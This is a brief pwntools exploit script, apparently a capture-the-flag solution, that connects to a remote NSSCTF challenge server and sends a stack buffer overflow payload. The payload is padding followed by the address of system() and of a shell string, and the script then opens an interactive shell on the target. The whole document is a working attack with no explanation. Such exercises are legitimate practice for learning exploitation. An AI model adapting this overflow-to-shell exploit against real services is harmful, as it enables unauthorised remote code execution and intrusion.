from pwn import *

l = remote('node5.anna.nssctf.cn',25627)

sys_addr = p32(0x08048529)

sh_addr = p32(0x08048670)

payload = (0x18+0x04)*b'A'+sys_addr+sh_addr

l.sendline(payload)

l.interactive()